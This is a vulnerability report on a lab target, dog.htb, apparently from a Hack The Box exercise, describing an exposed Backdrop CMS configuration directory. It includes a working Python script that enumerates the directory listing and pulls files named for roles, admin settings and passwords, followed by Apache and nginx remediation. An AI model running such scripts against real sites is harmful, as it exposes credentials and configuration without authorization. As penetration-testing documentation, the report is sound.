# Exposed Configuration Directory Information Disclosure

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-03-03 18:21:24 UTC
**Target:** dog.htb
**Endpoint:** /files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/
**Method:** GET
**CWE:** CWE-548
**CVSS:** 5.3

## Description

The Backdrop CMS configuration directory located at /files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/ was found to be publicly browsable, allowing unauthorized access to 75 JSON configuration files. These files contain sensitive system configuration including user role definitions, permissions, site settings, and module configurations.

## Impact

An attacker can access detailed system configuration including:
- User role definitions and permission mappings
- Site configuration (name, email, themes)
- Module settings and API keys
- Field definitions and content types
- Administrative settings

This information can be used to:
- Understand application architecture for targeted attacks
- Identify high-privilege accounts
- Discover application features and endpoints
- Plan privilege escalation attacks

## Technical Analysis

The configuration directory uses a hashed name (config_83dddd18e1ec67fd8ff5bba2453c7fb3) but is located within the web-accessible /files/ directory. Apache directory listing is enabled, allowing browsing of all configuration files. The files are stored as JSON and contain detailed system configuration that should not be publicly accessible.

## Proof of Concept

1. Navigate to http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/
2. Observe directory listing showing 75+ configuration files
3. Access individual files like user.role.administrator.json
4. Review system configuration without authentication

```
#!/usr/bin/env python3
"""Proof of Concept for Configuration Directory Exposure"""

import requests
import json
from bs4 import BeautifulSoup

TARGET = "http://dog.htb"
CONFIG_BASE = f"{TARGET}/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/"

def enumerate_configs():
    """Enumerate and extract configuration files"""
    print(f"[*] Accessing configuration directory...")
    
    r = requests.get(CONFIG_BASE, timeout=10)
    if r.status_code != 200:
        print(f"[-] Failed to access config directory: {r.status_code}")
        return
    
    # Parse directory listing
    soup = BeautifulSoup(r.text, 'html.parser')
    files = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href and href.endswith('.json'):
            files.append(href)
    
    print(f"[+] Found {len(files)} configuration files")
    
    # Download and analyze interesting files
    interesting = [f for f in files if any(x in f for x in 
        ['user.role', 'system.core', 'admin', 'password'])]
    
    print(f"\n[*] Interesting files ({len(interesting)}):")
    for fname in interesting[:5]:
        url = CONFIG_BASE + fname
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            try:
                data = json.loads(r.text)
                print(f"\n[+] {fname}:")
                print(f"    {json.dumps(data, indent=2)[:300]}...")
            except:
                print(f"    Raw: {r.text[:200]}...")

if __name__ == "__main__":
    enumerate_configs()
```

## Remediation

1. Disable directory listing in Apache:
   Add to .htaccess in /files/ directory:
   Options -Indexes
   
2. Move configuration directory outside web root:
   - Update settings.php to point to new location
   - Ensure new location is not web-accessible
   
3. Add .htaccess protection to config directory:
   <IfModule mod_rewrite.c>
     RewriteEngine On
     RewriteRule ^.*$ - [F,L]
   </IfModule>
   
4. Alternatively, use nginx/apache configuration to deny access:
   Apache:
   <Directory /var/www/html/files/config_*>
     Order deny,allow
     Deny from all
   </Directory>
   
   Nginx:
   location ~ /files/config_ {
     deny all;
     return 403;
   }
